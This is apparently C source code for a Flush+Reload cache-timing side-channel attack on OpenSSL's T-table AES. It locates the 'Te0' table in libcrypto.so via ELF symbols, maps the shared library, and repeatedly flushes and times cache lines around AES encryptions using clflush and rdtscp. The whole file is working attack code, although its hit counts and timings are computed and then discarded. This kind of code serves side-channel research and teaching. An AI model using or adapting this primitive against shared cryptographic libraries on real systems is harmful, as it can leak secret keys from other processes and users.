#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <libelf.h>
#include <gelf.h>

#include "sc-attacks.h"

#define KIB ((size_t)1024)
#define ALIGN_UP(ptr, align) \
	((((uintptr_t)ptr) & (align - 1)) ? ((((uintptr_t)ptr) + (align - 1)) & ~(align - 1)) : ((uintptr_t)ptr))

static inline void clflush(volatile void *p)
{
	asm volatile("clflush (%0)\n" ::"r"(p));
}

static inline uint64_t rdtsc(void)
{
	uint64_t lo, hi;

	asm volatile("rdtscp\n"
		     : "=a"(lo), "=d"(hi)::"%rcx");

	lo |= (hi << 32);

	return lo;
}

int stricmp(const char *lhs, const char *rhs)
{
	while (tolower(*lhs) == tolower(*rhs))
	{
		if (*lhs == '\0')
			break;

		++lhs;
		++rhs;
	}

	return (int)tolower(*lhs) - (int)tolower(*rhs);
}

int gelf_find_sym(GElf_Sym *ret, Elf *elf, const char *key)
{
	Elf_Scn *scn = NULL;
	GElf_Shdr shdr;
	GElf_Sym sym;
	Elf_Data *data;
	const char *name;
	size_t i, count;

	while ((scn = elf_nextscn(elf, scn)) != NULL)
	{
		gelf_getshdr(scn, &shdr);

		if (shdr.sh_type != SHT_SYMTAB)
			continue;

		data = elf_getdata(scn, NULL);
		count = shdr.sh_size / shdr.sh_entsize;

		for (i = 0; i < count; ++i)
		{
			gelf_getsym(data, i, &sym);
			name = elf_strptr(elf, shdr.sh_link, sym.st_name);

			if (stricmp(name, key) != 0)
				continue;

			if (ret)
				*ret = sym;

			return 0;
		}
	}

	return -1;
}

void *gelf_find_sym_ptr(Elf *elf, const char *key)
{
	GElf_Sym sym;

	if (gelf_find_sym(&sym, elf, key) < 0)
		return NULL;

	return (void *)sym.st_value;
}

void *crypto_find_te0(int fd)
{
	Elf *elf;
	void *base;

	elf_version(EV_CURRENT);

	elf = elf_begin(fd, ELF_C_READ, NULL);

	if (!(base = gelf_find_sym_ptr(elf, "Te0")))
	{
		fprintf(stderr, "error: unable to find the 'Te0' symbol in "
				"libcrypto.so.\n\nPlease compile a version of OpenSSL with the "
				"T-table AES implementation enabled.\n");
		return NULL;
	}

	elf_end(elf);

	return base;
}

unsigned char key_data[32] = {0};

unsigned char plain[16];
unsigned char cipher[128];
unsigned char restored[128];

void execute_side_channel(void)
{
	AES_KEY key;
	uint64_t dt, t0;
	struct stat stat;
	int fd;
	char *base;
	char *te0;
	char *cl;
	size_t count, size;
	size_t round;
	size_t i, j;
	size_t byte;

	if (!init_sc())
		return;

#ifndef ATTACK_TARGET
#error "You must specify the libcrypto.so path as ATTACK_TARGET param to make"
#endif

	if ((fd = open(ATTACK_TARGET, O_RDONLY)) < 0)
	{
		perror("open");
		return;
	}

	if (!(te0 = crypto_find_te0(fd)))
		return;

	if (fstat(fd, &stat) < 0)
	{
		fprintf(stderr, "error: unable to get the file size of libcrypto.so\n");
		return;
	}

	size = ALIGN_UP(stat.st_size, 4 * KIB);

	if ((base = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED)
	{
		fprintf(stderr, "error: unable to map libcrypto.so\n");
		return;
	}

	AES_set_encrypt_key(key_data, 128, &key);

	for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64)
	{
		struct timespec past, now;
		double diff;

		clock_gettime(CLOCK_MONOTONIC, &past);

		for (byte = 0; byte < 256; byte += 16)
		{
			plain[0] = byte;

			count = 0;

			for (round = 0; round < 1000000; ++round)
			{
				for (i = 1; i < 16; ++i)
				{
					plain[i] = rand() % 256;
				}

				clflush(cl);
				asm volatile("mfence" ::
						 : "memory");
				AES_encrypt(plain, cipher, &key);
				sched_yield();

				t0 = rdtsc();
				*(volatile char *)cl;
				dt = rdtsc() - t0;

				/* Skylake: 150 */

				if (dt < 150)
					++count;
			}

			fflush(stdout);
		}

		clock_gettime(CLOCK_MONOTONIC, &now);

		diff = now.tv_sec + now.tv_nsec * .000000001;
		diff -= past.tv_sec + past.tv_nsec * .000000001;
	}

	close(fd);

	return;
}
